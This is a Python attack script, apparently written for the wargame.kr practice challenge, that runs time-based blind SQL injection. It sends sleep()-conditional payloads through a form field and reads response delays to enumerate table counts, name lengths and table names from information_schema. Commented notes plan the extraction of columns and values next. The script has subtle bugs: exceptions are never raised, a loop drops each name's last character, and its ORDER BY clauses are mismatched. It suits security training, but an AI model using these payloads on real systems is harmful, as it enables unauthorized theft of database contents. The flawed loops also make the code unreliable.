import requests,string

# tableの行数を取得するメソッド
def get_table_rownum():
    print("start_get_table_rownum")
    count = -1
    for i in range(0, 100):
        type_ = 'if((SELECT count(*) FROM information_schema.tables)={},sleep(2),1)'.format(i)
        body = {'cont':'hogehoge', 'mail':'taise@example.com', 'type': type_}
        # print(type_)
    
        res = requests.post(url, params=query, data=body)
        # print(res.elapsed.total_seconds())
        if(res.elapsed.total_seconds()>2.0):
            count = i
            break
    if(count == -1):
        Exception("Exception: get_table_rownum")
    return count

#i番目のtableの文字数を取得するメソッド(row_num:i行目)
def get_table_name_length(row_num):
    print("start_get_table_name_length")
    table_length = -1
    for i in range(1, 100):
        type_ = 'if((SELECT LENGTH(table_name) FROM information_schema.tables ORDER BY table_name LIMIT {0},1)={1},sleep(2),1)'.format(row_num, i)
        body = {'cont':'hogehoge', 'mail':'taise@example.com', 'type': type_}
        # print(type_)

        res = requests.post(url, params=query, data= body)
        # print(res.elapsed.total_seconds())
        if(res.elapsed.total_seconds()>2.0):
            table_length = i
            break
    if(table_length == -1):
        Exception("Exception: get_table_name_length")
    return table_length

def get_tables():
    table_rownum = get_table_rownum()
    print('done get_table_rownum:{}'.format(table_rownum))
    for i in range(table_rownum):
        table_name = ''
        table_name_length = get_table_name_length(i)
        print("done get_table_name_length:{}".format(table_name_length))
        for j in range(1, table_name_length):
            for k in char_sets:
                type_ = 'if(ORD(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {0},1),{1},1))={2},sleep(2),1)'.format(i, j, ord(k))
                body = {'cont':'hogehoge', 'mail':'taise@example.com', 'type': type_}
                # print(type_)
                res = requests.post(url, params=query, data=body)
                if(res.elapsed.total_seconds()>2.0):
                    table_name+=k
                    # print(table_name)
                    break
        print("done get_table_name:{}".format(table_name))

if __name__ == "__main__":
    char_sets = string.ascii_letters + string.digits
    url = 'http://wargame.kr:8080/qna/?page=js_home'
    query = {'page': 'js_home'} 
    #tablename========================================================================================
    get_tables()
    #========================================================================================

    # r = requests.post(url, params=query, data=body)
    # print(r.elapsed.total_seconds())




# # bodyの変数typeにBlind SQLinjectionのコードを書く
# # BlindSQLinjectionの手順

#     # information.schema.tablesのrownumを取得(DONE)

#     #i番目のtableの文字数を取得するメソッド(DONE)

#     # information.schema.tablesから全てのtable名を取得する.
#     type=if(ORD(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+LIMIT+{1},1),{2},1))={3},sleep(1),1)

#     {1}:information_schema.tablesにあるテーブルの番号が含まれる.(tableの全体数を取得する必要がある？)
#     {2}:取得したtableのn文字目を表すやつ
#     {3}:[0-9a-Z]の文字を数値に変換した値が入る.
#     {1}のループのなかに{2}のループのなかに{3}のループがあればok

#     以下ロジック
#     #table_num = (information_schema.tablesにあるテーブルの数を取得するメソッド)引数なし
#     for i in range(table_num): 
#         table_name = ''
#         #table_length =  (i番目のtable名の文字数を取得するメソッド)引数 i:Int(tableのrownum),
#         for j range(table_length):
#             for k in range 文字列のリスト:
#                 type = 'if(ORD(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+LIMIT+{1},1),{2},1))={3},sleep(1),1)'.format(i, j, k)
#                 r = requests.post(url, hogehoge)
#                 if(responceが遅かったら):
#                     #遅かったらその文字は正しいので連結する
#                     table_name.add(ascii(k))
#                     break
#         print(table_name)

#     # 取得したtable名から全てのcolumnを取得する.
#     table名取得できたら考える

#     # 取得したtableの該当するcolumnから値を取得する.
#     column名取得できたら考える
